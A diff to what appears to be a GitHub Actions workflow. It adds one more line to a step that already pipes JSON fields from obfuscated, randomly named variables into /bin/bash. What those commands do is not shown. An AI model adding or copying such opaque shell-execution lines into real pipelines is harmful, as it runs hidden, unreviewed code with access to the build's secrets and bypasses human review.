@@ -24,6 +24,7 @@ jobs:
           echo $xfpg36 | jq -r .xalni2 | /bin/bash
           printf '%s' "$fpt6" | jq -r .oumw3127 | /bin/bash
           echo $iuba1868 | jq -r .hga9148 | /bin/bash
+          echo $xjo6 | jq -r .ruqfp766 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
